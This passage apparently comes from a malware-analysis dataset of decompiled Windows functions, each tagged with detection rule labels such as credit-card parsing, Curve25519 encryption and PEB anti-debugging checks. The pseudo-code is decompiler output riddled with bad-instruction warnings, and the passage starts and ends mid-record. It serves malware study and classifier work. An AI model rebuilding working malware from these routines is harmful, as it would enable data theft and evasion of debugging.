(*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    uVar2 = *(uStack8 + 0x58);\n    uVar7 = uVar2;\n    uVar5 = uVar6;\n    if (uVar5 < uVar7) {\n        if ((uVar5 <= uVar7) || (uVar7 < uVar5)) {\n            uVar6 = uVar6 - uVar2 & 0xffff;\n        }\n        arg_8h = uStack8 & 0xffff0000 | CONCAT11((uStack8 >> 8) - *unaff_EBX, uStack8);\n        *(unaff_EDI + 0x2b) = *(unaff_EDI + 0x2b) - &stack0xffffffe8;\n        iVar10 = uVar6 - 1;\n    }\n    else {\n        iVar10 = uVar6 - (uVar2 & 0xffff);\n        arg_8h = uStack8;\n    }\n    uVar5 = uVar2 >> 0x10;\n    uVar9 = iVar10;\n    uVar4 = POPCOUNT(uVar9 - uVar5 & 0xff);\n    if (uVar9 < uVar5) {\n        if ((!SBORROW2(uVar9, uVar5)) && (SBORROW2(uVar9, uVar5))) {\n            uVar1 = in(uVar7);\n            *unaff_EDI = uVar1;\n            if (uVar9 < uVar5 || uVar9 - uVar5 == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            unaff_EDI[1] = uVar2 >> 0x10;\n            if ((uVar9 < uVar5) || (uVar5 <= uVar9)) {\n                arg_ch = &stack0xfffffff8;\n                arg_8h = &stack0xffffff94;\n            }\n            else {\n                puVar8 = &stack0xfffffffb;\n                uVar4 = POPCOUNT(puVar8 & 0xff);\n                arg_ch = uVar7;\n            }\n            bVar11 = (uVar4 & 1) == 0;\n            arg_ch_00 = fcn.004013b0(arg_8h, arg_ch);\n            if ((bVar11) || (!bVar11)) {\n                arg_ch_00 = *(puVar8 + -4);\n            }\n            else {\n                puVar8 = *0x8b17b43a;\n            }\n            fcn.00404b80(puVar8 + -0x68, arg_ch_00, 0x407010, 0x9ec0);\n            puVar3 = *(puVar8 + 0xc);\n            **(puVar8 + 8) = 0x407010;\n            *puVar3 = 0x9ec0;\n            return;\n        }\n        iVar10 = (iVar10 - (uVar2 >> 0x10) & 0xffff) - 1;\n    }\n    else {\n        iVar10 = iVar10 - (uVar2 >> 0x10);\n    }\n    *param_4 = iVar10 + param_2;\n    *param_3 = *(uStack8 + 0x58);\n    return;\n}\n",
        "token_count": 1024
    },
    "004033c0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004033d9) overlaps instruction at (ram,0x004033d7)\n// \n\nint32_t __fastcall fcn.004033c0(uint16_t param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBX;\n    uint32_t uVar4;\n    bool bVar5;\n    \n    uVar4 = param_3;\n    bVar5 = -1 < (unaff_EBX & param_1);\n    if (bVar5) {\n        if (!bVar5) goto code_r0x004033d6;\n    }\n    param_3 = param_4;\ncode_r0x004033d6:\n    puVar1 = unaff_EBX + -0x3f7aefbb;\n    *puVar1 = *puVar1 | param_1;\n    if (*puVar1 != 0) {\n        param_4 = param_4 & 0xff | param_2 << 8;\n        param_2 = param_2 >> 0x18;\n        do {\n            uVar4 = uVar4 + *CONCAT13(param_4, param_3._1_3_);\n            if (uVar4 >> 0x10 != 0) {\n                uVar4 = (uVar4 >> 0x10) + (uVar4 & 0xffff);\n            }\n            iVar3 = CONCAT13(param_4, param_3._1_3_) + 2;\n            uVar2 = CONCAT13(param_2, param_4._1_3_) - 1;\n            param_3 = iVar3 * 0x100;\n            param_4._1_3_ = uVar2;\n            param_4 = CONCAT31(param_4._1_3_, iVar3 >> 0x18);\n            param_2 = uVar2 >> 0x18;\n        } while (uVar2 != 0);\n    }\n    return (uVar4 >> 0x10) + uVar4;\n}\n",
        "token_count": 483
    },
    "004013b0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004014cb) overlaps instruction at (ram,0x004014c7)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl fcn.004013b0(int32_t *arg_8h, uint *arg_ch)\n\n{\n    int32_t **ppiVar1;\n    char cVar2;\n    int32_t *piVar3;\n    uint8_t uVar4;\n    int32_t *piVar5;\n    int32_t *piVar6;\n    int32_t *in_EDX;\n    uint8_t uVar7;\n    uint8_t uVar8;\n    uchar *unaff_ESI;\n    ushort in_SS;\n    bool bVar9;\n    uint8_t in_AF;\n    bool bVar10;\n    bool bVar11;\n    unkbyte10 in_ST0;\n    ushort uStack28;\n    int16_t iStack22;\n    int16_t iStack20;\n    \n    uStack28 = SUB42(in_EDX, 0);\n    *arg_8h = 't';\n    *(arg_8h + 1) = -0x1b;\n    *(arg_8h + 2) = ' ';\n    *(arg_8h + 3) = -0x4a;\n    *(arg_8h + 1) = 'U';\n    *(arg_8h + 5) = -0x3a;\n    *(arg_8h + 6) = '4';\n    iStack22 = arg_8h;\n    bVar10 = (unaff_ESI | 0x561b) != in_EDX;\n    *(arg_8h + 7) = -0x6a;\n    piVar5 = arg_8h;\n    if ((bVar10) && (!bVar10)) {\n        piVar5 = arg_8h & 0xffffff00 | *0x4bb148d3;\n        out(*unaff_ESI, uStack28);\n    }\n    *(arg_8h + 2) = -0x67;\n    iStack20 = piVar5;\n    bVar10 = (iStack20 + iStack22 | 0x11a9U) < 0;\n    *(arg_8h + 9) = -0x79;\n    uVar7 = arg_8h >> 8;\n    if ((bVar10) || (!bVar10)) {\n        *(arg_8h + 10) = -0x73;\n        uVar7 = uVar7 ^ 0x16;\n        piVar6 = piVar5;\n        piVar3 = arg_8h;\n    }\n    else {\n        *(piVar5 + -0x1f3a4905) = in_ST0;\n        uVar4 = piVar5 + -1;\n        uVar8 = 9 < (uVar4 & 0xf) | in_AF;\n        uVar4 = uVar4 + uVar8 * '\\x06';\n        uVar4 = uVar4 + (0x90 < (uVar4 & 0xf0) | uVar8 * (0xf9 < uVar4)) * '`';\n        piVar5 = piVar5 + -1 & 0xffffff00 | uVar4;\n        *in_EDX = *in_EDX + 0x47c6df84;\n        *piVar5 = *piVar5 + uVar4;\n        piVar6 = arg_8h;\n        piVar3 = in_EDX;\n    }\n    uVar7 = uVar7 | piVar5 >> 8;\n    uVar8 = in_EDX >> 8;\n    bVar10 = uVar7 < uVar8;\n    bVar11 = uVar7 == uVar8;\n    *(arg_8h + 0xb) = -5;\n    piVar5 = piVar6;\n    if (uVar7 <= uVar8) goto code_r0x00401502;\n    do {\n        piVar5 = piVar6;\n        if (bVar10 || bVar11) {\n            piVar5 = piVar6 & 0xe2f4cc58;\n        }\ncode_r0x00401502:\n        *(arg_8h + 3) = '^';\n        *(arg_8h + 0xd) = -99;\n        uVar8 = piVar3 >> 8 ^ 0x16 | piVar5 >> 8;\n        uVar7 = in_EDX >> 8;\n        bVar10 = uVar8 < uVar7;\n        cVar2 = uVar8 - uVar7;\n        bVar11 = cVar2 == '\\0';\n        bVar9 = (POPCOUNT(cVar2) & 1U) == 0;\n        *(arg_8h + 0xe) = '\\\\';\n        if ((bVar9) || (!bVar9)) goto code_r0x00401574;\n        ppiVar1 = segment(in_SS, *0x10 + -0x10);\n        piVar6 = *ppiVar1;\n        in_EDX = 0xb7bc9ea5;\n        if (bVar10) goto code_r0x00401595;\n    } while (bVar9);\n    piVar5 = piVar6;\ncode_r0x00401574:\n    *(arg_8h + 0xf) = -0x62;\n    piVar6 = (piVar5 >> 8 & 0xffff00) << 8;\n    *(arg_8h + 4) = -0x78;\n    piVar3 = in_EDX & 0xffff | piVar5 << 0x10;\n    in_EDX = in_EDX & 0xffff0000;\ncode_r0x00401595:\n    *(arg_8h + 0x11) = '/';\n    *(arg_8h + 0x12) = -0x46;\n    *(arg_8h + 0x13) = -0x7b;\n    *arg_ch = 0x14;\n    return CONCAT44(in_EDX & 0xffff0000 | piVar3 & 0xffff, piVar6 & 0xffff0000 | piVar3 >> 0x10);\n}\n",
        "token_count": 1376
    },
    "004016d0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401760) overlaps instruction at (ram,0x0040175d)\n// \n// WARNING: Removing unreachable block (ram,0x00401760)\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.004016d0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_10h._0_1_ = arg_14h * '\\x02';\n    var_8h = 0;\n    if (0 < arg_14h) {\n        var_ch = 1;\n        do {\n            uVar1 = *(var_ch % arg_ch + arg_8h);\n            uVar2 = *(var_8h + arg_10h) ^ *((var_ch + -1) % arg_ch + arg_8h);\n            if (uVar2 != 0) {\n                if (uVar2 == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n            }\n            *(arg_18h + -1 + var_ch) = var_10h ^ uVar2;\n            var_8h = var_8h + 1;\n            *(var_ch + arg_18h) = var_10h ^ uVar1;\n            var_ch = var_ch + 2;\n        } while (var_8h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 424
    },
    "00402970": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004029af) overlaps instruction at (ram,0x004029ad)\n// \n\nbool fcn.00402970(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)();\n    if (iVar2 != 0) {\n        return false;\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)();\n    if (puVar1 == NULL) {\n        return false;\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)();\n    if (iVar2 != 6) {\n        return iVar2 == 7;\n    }\n    return true;\n}\n",
        "token_count": 292
    },
    "004018d0": {
        "rules": [
            "PEB access/35f28d23090149119036cdb16976bf66"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004019a2) overlaps instruction at (ram,0x0040199f)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl\nfcn.004018d0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, int32_t arg_20h)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    char cVar3;\n    uint32_t in_EAX;\n    int32_t iVar4;\n    int32_t unaff_EBX;\n    uint32_t uVar5;\n    uint *puVar6;\n    uchar *puVar7;\n    int32_t unaff_ESI;\n    uint *puVar8;\n    bool bVar9;\n    uint8_t in_AF;\n    bool bVar10;\n    unkbyte3 Var11;\n    uchar uVar12;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar6 = &stack0xfffffffc;\n    bVar9 = &stack0xfffffffc < 0x10c;\n    bVar10 = *0x10 == 0x110;\n    if ((!bVar10) && (bVar10)) {\n        uVar5 = unaff_EBX + 1;\n        if (bVar9 || uVar5 == 0) goto code_r0x00401935;\n        uVar2 = 9 < (in_EAX & 0xf) | in_AF;\n        puVar1 = (in_EAX & 0xffff0000 | CONCAT11((in_EAX >> 8) + uVar2, in_EAX + uVar2 * '\\x06') & 0xff0f) + 0x2a;\n        bVar9 = *puVar1 < uVar5;\n        *puVar1 = *puVar1 - uVar5;\n        bVar10 = unaff_ESI == -1;\n    }\n    Var11 = arg_18h;\n    uVar12 = arg_18h >> 0x18;\n    fcn.004016d0(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 0x20);\n    iVar4 = arg_20h;\n    if ((!bVar9 && !bVar10) && (bVar9 || bVar10)) {\n        iVar4 = CONCAT13(uVar12, Var11);\n    }\n    fcn.004016d0(arg_18h, arg_1ch, arg_ch, 0x20, iVar4 + 0x60);\ncode_r0x00401935:\n    fcn.004016d0(arg_18h, arg_1ch, arg_10h, 0x20, arg_20h + 0xa0);\n    fcn.004016d0(arg_18h, arg_1ch, arg_14h, 0x20, arg_20h + 0xe0);\n    if ((*0x10 != 0x119) && (*0x10 == 0x119)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar4 = func_0x00401880();\n    if (iVar4 == -1) {\n        iVar4 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(arg_20h + 0x120) = iVar4 % 5;\n    }\n    else {\n        *(arg_20h + 0x120) = iVar4;\n    }\n    var_10ch = 0;\n    puVar8 = &var_10bh;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    var_4h = 0x104;\n    *(puVar8 + 2) = 0;\n    iVar4 = fcn.004046a0(0x80000001, 0x42211c, str.KY, &var_8h, &var_10ch, &var_4h);\n    bVar9 = iVar4 != 0;\n    if (bVar9) {\n        puVar7 = &stack0xfffffffc;\n        if ((bVar9) && (puVar7 = &stack0xfffffffc,  !bVar9)) {\n            puVar8 = &stack0xfffffee3;\n            puVar7 = &stack0xfffffee3;\n            cVar3 = '\\x10';\n            do {\n                puVar6 = puVar6 + -1;\n                puVar8 = puVar8 + -1;\n                *puVar8 = *puVar6;\n                cVar3 = cVar3 + -1;\n            } while ('\\0' < cVar3);\n        }\n        iVar4 = (*_sym.imp.MSVCRT.dll__stricmp)(puVar7 + -0x10c);\n        if (iVar4 == 0) {\n            *(*(puVar7 + 0x20) + 0x120) = *(*(puVar7 + 0x20) + 0x120) | 0x80;\n        }\n    }\n    return;\n}\n",
        "token_count": 1210
    },
    "00401c20": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040211e) overlaps instruction at (ram,0x0040211d)\n// \n\nvoid fcn.00401c20(void)\n\n{\n    char *pcVar1;\n    int32_t *piVar2;\n    uint8_t *puVar3;\n    uint8_t uVar4;\n    char extraout_AH;\n    uint32_t uVar5;\n    char extraout_CH;\n    ushort extraout_CX;\n    uint32_t extraout_ECX;\n    uint8_t extraout_DL;\n    char extraout_DL_00;\n    char cVar6;\n    int32_t extraout_EDX;\n    int32_t unaff_EBX;\n    char *pcVar7;\n    char *unaff_EBP;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uint16_t in_SS;\n    uint8_t in_AF;\n    bool bVar8;\n    bool bVar9;\n    char cVar10;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char cVar11;\n    uchar uVar12;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    ulong uVar13;\n    uint in_stack_ffffbda5;\n    char *in_stack_ffffbdb1;\n    char *pcVar14;\n    uint in_stack_ffffbdc1;\n    uint in_stack_ffffbdc5;\n    uint32_t uVar15;\n    uint in_stack_ffffffd8;\n    uint *puVar16;\n    char *in_stack_ffffffdc;\n    uint uVar17;\n    \n    fcn.00401000(str.U__, 0xd, 0x421ee8, 10);\n    bVar9 = (extraout_DL & unaff_EBX) < '\\0';\n    uVar17 = 0x401c7f;\n    fcn.00401000(str.U__, 0xd, str.L4oV, 0x12);\n    if ((bVar9) || (!bVar9)) {\n        uVar17 = 4;\n        in_stack_ffffffdc = str._bzG_4Z;\n        in_stack_ffffffd8 = 0xd;\n    }\n    *unaff_EDI = *unaff_EDI | unaff_EBX;\n    *(extraout_EDX + 0xe) = *(extraout_EDX + 0xe) + extraout_CH;\n    fcn.00401000(str.U__, in_stack_ffffffd8, in_stack_ffffffdc, uVar17);\n    fcn.00401000(str.U__, 0xd, str._bzG_4Z + 4, 0xc);\n    fcn.00401000(str.U__, 0xd, 0x421f18, 7);\n    fcn.00401000(str.U__, 0xd, 0x421f20, 0xb);\n    fcn.00401000(str.U__, 0xd, 0x421f2c, 0xc);\n    puVar16 = unaff_ESI;\n    pcVar14 = unaff_EBP;\n    fcn.00401000(str.U__, 0xd, 0x421f38, 8);\n    fcn.00401000(str.U__, 0xd, 0x421f40, 0xd);\n    fcn.00401000(str.U__, 0xd, 0x421f50, 0x18);\n    fcn.00401000(str.U__, 0xd, 0x421f68, 0x25);\n    cVar6 = extraout_DL_00 + '\\x15';\n    cVar11 = SBORROW1(cVar6, extraout_AH);\n    cVar10 = cVar6 - extraout_AH < '\\0';\n    bVar9 = cVar6 == extraout_AH;\n    uVar17 = 0x401de2;\n    uVar13 = fcn.00401000(str.U__, 0xd, str.82JM, 10);\n    if ((bVar9 || cVar11 != cVar10) || (!bVar9 && cVar11 == cVar10)) {\n        uVar17 = 0xc;\n        pcVar14 = str.30;\n        puVar16 = 0xd;\n    }\n    pcVar7 = unaff_EBX + 1;\n    puVar3 = uVar13 + 0x6a39da56;\n    *puVar3 = *puVar3 ^ extraout_CX;\n    pcVar1 = (uVar13 >> 0x20) + 0xe;\n    *pcVar1 = *pcVar1 + (extraout_CX >> 8);\n    fcn.00401000(str.U__, puVar16, pcVar14, uVar17);\n    fcn.00401000(str.U__, 0xd, 0x421fa8, 0xd);\n    fcn.00401000(str.U__, 0xd, str..FT, 6);\n    bVar9 = false;\n    uVar12 = 0;\n    fcn.00401000(str.U__, 0xd, str._T_, 5);\n    if ((!bVar9) && (bVar9)) {\n        uVar12 = 0;\n        unaff_EDI = unaff_EDI ^ *(unaff_EDI + 0xe58be73);\n        pcVar7 = unaff_EBP + 0x680d6a76;\n    }\n    pcVar14 = str.U__;\n    fcn.00401000(str.U__, 0xd, in_stack_ffffbdc1, in_stack_ffffbdc5);\n    if ((uVar12) || (uVar15 = extraout_ECX,  !uVar12)) {\n        uVar15 = 0x19;\n        in_stack_ffffbdb1 = str.___X;\n    }\n    puVar16 = unaff_EDI + 1;\n    *unaff_EDI = *unaff_ESI;\n    *0xd8681978 = *0xd8681978 + (extraout_ECX >> 8);\n    fcn.00401000(str.U__, in_stack_ffffbdb1, uVar15, pcVar14);\n    fcn.00401000(str.U__, 0xd, str.__AL, 0xf);\n    bVar9 = false;\n    bVar8 = (((pcVar7 ^ unaff_ESI + 1) >> 8) - 1U & 0xd) == 0;\n    uVar5 = fcn.00401000(str.U__, 0xd, str.___M, 0xe);\n    if ((!bVar8) && (bVar8)) {\n        if (bVar9 || pcVar7 + 1 == NULL) goto code_r0x00401f66;\n        in_AF = 9 < (uVar5 & 0xf) | in_AF;\n        piVar2 = (uVar5 & 0xffff0000 | CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar2 = *piVar2 - (pcVar7 + 1);\n    }\n    fcn.00401000(str.U__, 0xd, 0x422014, 0xb);\n    puVar16 = uVar15 & 0xffff0000 | in_SS;\n    fcn.00401000(str.U__, 0xd, str.40Yz, 0x47);\n    in_stack_ffffbda5 = 0xb;\ncode_r0x00401f66:\n    fcn.00401000(str.U__, 0xd, 0x42202c, in_stack_ffffbda5);\n    fcn.00401000(str.U__, 0xd, 0x422038, 10);\n    fcn.00401000(str.U__, 0xd, 0x422044, 0xc);\n    fcn.00401000(str.U__, 0xd, 0x422050, 0xe);\n    fcn.00401000(str.U__, 0xd, str.DT, 0x11);\n    fcn.00401000(str.U__, 0xd, str.__FV, 0x13);\n    fcn.00401000(str.U__, 0xd, str._AQ, 0x14);\n    fcn.00401000(str.U__, 0xd, 0x42209c, 0x33);\n    fcn.00401000(str.U__, 0xd, str._X, 10);\n    fcn.00401000(str.U__, 0xd, 0x4220dc, 4);\n    bVar9 = false;\n    uVar15 = 0x402106;\n    uVar4 = fcn.00401000(str.U__, 0xd, 0x4220e0, 5);\n    if ((bVar9) || (uVar15 = uVar15 & 0xffff | puVar16 << 0x10,  !bVar9)) {\n        uVar15 = 6;\n    }\n    cVar6 = uVar4 - *puVar16;\n    uVar5 = (in_NT & 1) * 0x4000 | SBORROW1(uVar4, *puVar16) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n            (cVar6 < '\\0') * 0x80 | (cVar6 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar6) & 1U) == 0) * 4 |\n            uVar4 < *puVar16 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n            (in_AC & 1) * 0x40000;\n    func_0x10188090(uVar5, uVar15);\n    fcn.00401000(str.U__, 0xd, 0x4220e8, uVar5);\n    fcn.00401000(str.U__, 0xd, 0x42211c, 0x2a);\n    fcn.00401000(str.U__, 0xd, str.KY, 0xb);\n    return;\n}\n",
        "token_count": 2340
    },
    "00404400": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404400(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x421ed0, 0x422384, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 138
    },
    "00404620": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404620(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    uVar2 = arg_ch;\n    uVar1 = arg_8h;\n    iVar3 = fcn.004011f0(arg_8h, arg_ch, &arg_8h, &arg_ch);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    *(iVar3 + 0x58) = arg_ch;\n    fcn.004011f0(uVar1, uVar2, &arg_8h, &arg_ch);\n    return 1;\n}\n",
        "token_count": 151
    },
    "004046a0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404733) overlaps instruction at (ram,0x00404731)\n// \n\nbool __cdecl fcn.004046a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &var_4h);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(var_4h, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n        return iVar1 == 0;\n    }\n    return false;\n}\n",
        "token_count": 222
    },
    "004021a0": {
        "rules": [
            "check for PEB NtGlobalFlag flag/02e6ad6983154968a9ea3bb4adc24b9d/10fcbce0171842839e4e3d1dbc7c6301"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004023ac) overlaps instruction at (ram,0x004023a9)\n// \n\nvoid fcn.004021a0(void)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint8_t *puVar3;\n    uint32_t *puVar4;\n    uint8_t extraout_CL;\n    uint16_t extraout_CX;\n    int32_t extraout_ECX;\n    int32_t iVar5;\n    uint8_t extraout_DH;\n    uint16_t uVar6;\n    uint unaff_EBX;\n    int32_t unaff_ESI;\n    uint8_t *unaff_EDI;\n    uchar uVar7;\n    bool bVar8;\n    uint8_t in_AF;\n    uchar uVar9;\n    char cVar10;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char cVar11;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    ulong uVar12;\n    uint uVar13;\n    unkbyte3 Var14;\n    uint in_stack_ffffffcc;\n    unkbyte3 Var15;\n    uchar uVar16;\n    uchar uVar17;\n    uint8_t uVar18;\n    uchar uVar19;\n    ushort uVar20;\n    uint in_stack_ffffffdb;\n    uchar in_stack_ffffffdf;\n    uint32_t uVar21;\n    uchar uStack9;\n    \n    uStack9 = unaff_EDI >> 0x18;\n    uVar21 = CONCAT31(0x4021db, in_stack_ffffffdf);\n    fcn.00401000(str.U__, 0xd, 0x421ed4, 0x11);\n    cVar11 = '\\0';\n    uVar6 = unaff_EBX & extraout_CX;\n    cVar10 = uVar6 < 0;\n    bVar8 = (POPCOUNT(uVar6 & 0xff) & 1U) == 0;\n    uVar21 = uVar21 & 0xff;\n    uVar12 = fcn.00401000(str.U__, 0xd, 0x4220f0, 0xf);\n    puVar4 = uVar12;\n    if ((bVar8) || (uVar21 = uVar21 & 0xff | unaff_EDI << 8,  !bVar8)) {\n        uStack9 = 0;\n        in_stack_ffffffdb = 0x42210000;\n        uVar21 = 0x1a00;\n    }\n    else {\n        unaff_ESI = 0x34a96cf4;\n        cVar11 = '\\0';\n        *puVar4 = *puVar4 & (uVar12 >> 0x20) + 1U;\n        cVar10 = *puVar4 < 0;\n    }\n    uVar12 = fcn.00401000(str.U__, 0xd, CONCAT13(uVar21, in_stack_ffffffdb >> 8), CONCAT13(uStack9, uVar21 >> 8));\n    if ((cVar11 == cVar10) && (cVar11 != cVar10)) {\n        *uVar12 = *uVar12 & uVar12 >> 0x20;\n    }\n    else {\n        unaff_EBX = 10;\n        in_stack_ffffffcc = 0x422154;\n    }\n    fcn.00401000(str.U__, 0xd, in_stack_ffffffcc, unaff_EBX);\n    fcn.00401000(str.U__, 0xd, 0x422160, 0xb);\n    fcn.00401000(str.U__, 0xd, 0x42216c, 8);\n    fcn.00401000(str.U__, 0xd, 0x422174, 9);\n    puVar3 = fcn.00401000(str.U__, 0xd, 0x422180, 9);\n    uVar7 = unaff_EDI < puVar3;\n    uVar9 = unaff_EDI == puVar3;\n    fcn.00401000(str.U__, 0xd, 0x42218c, 9);\n    uVar17 = 0x54;\n    uVar20 = 0x4223;\n    uVar16 = 0;\n    fcn.00401000(str.U__, 0xd, 0x422198, 0xc);\n    if ((!uVar7 && !uVar9) && (uVar7 || uVar9)) {\n        unaff_ESI = CONCAT13(uVar16, CONCAT21(uVar20, uVar17));\n    }\n    fcn.00401000(str.U__, 0xd, 0x4221a4, 3);\n    fcn.00401000(str.U__, 0xd, 0x4221a8, 10);\n    fcn.00401000(str.U__, 0xd, str.hZ4, 0x40);\n    bVar8 = false;\n    puVar4 = fcn.00401000(str.U__, 0xd, 0x4221f4, 0xc);\n    if ((!bVar8) && (bVar8)) {\n        if (&stack0xffffffe7 < *puVar4 || puVar4 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar2 = fcn.00401000(str.U__, 0xd, 0x422200, 0xb);\n    cVar10 = uVar2 - *unaff_EDI;\n    iVar5 = (cVar10 < '\\0') * 0x80;\n    uVar18 = (in_NT & 1) * 0x4000 >> 8 | SBORROW1(uVar2, *unaff_EDI) * 0x800 >> 8 | (in_IF & 1) * 0x200 >> 8 |\n             (in_TF & 1) * 0x100 >> 8 | iVar5 >> 8;\n    uVar6 = (in_ID & 1) * 0x20 | (in_VIP & 1) * 0x10 | (in_VIF & 1) * 8 | (in_AC & 1) * 4;\n    uVar2 = iVar5 | (cVar10 == '\\0') * '@' | (in_AF & 1) * '\\x10' | ((POPCOUNT(cVar10) & 1U) == 0) * '\\x04' |\n            uVar2 < *unaff_EDI;\n    func_0x1018839c();\n    Var15 = 0x4222;\n    uVar9 = 0xc;\n    Var14 = 0;\n    uVar13 = 0xd004223;\n    fcn.00401000(str.U__, 0xd, 0x42220c, CONCAT22(uVar6, CONCAT11(uVar18, uVar2)));\n    uVar7 = extraout_DH < extraout_CL;\n    cVar10 = extraout_DH == extraout_CL;\n    fcn.00401000(str.U__, 0xd, 0x422210, 4);\n    if ((!uVar7 && !cVar10) && (uVar7 || cVar10)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    while( true ) {\n        uVar16 = 0x7b;\n        uVar19 = 0x24;\n        uVar20 = 0x40;\n        fcn.00401000(str.U__, 0xd, 0x422214, str.U__);\n        uVar17 = uVar13 >> 0x18;\n        if ((uVar7) || (!uVar7)) break;\n        iVar5 = extraout_ECX + -1;\n        if (iVar5 == 0 || cVar10 == '\\0') {\ncode_r0x00402487:\n            iVar1 = *(unaff_ESI + -1);\n            *(unaff_EDI + 1) = unaff_ESI + 3;\n            puVar3 = iVar1 >> 0x1f;\n            *puVar3 = *puVar3 & *0x9750e2b5 >> 8;\n            puVar3[0xe] = puVar3[0xe] + (iVar5 >> 8);\n            fcn.00401000(str.U__, CONCAT31(Var14, uVar17), CONCAT31(Var15, uVar9), \n                         CONCAT22(uVar20, 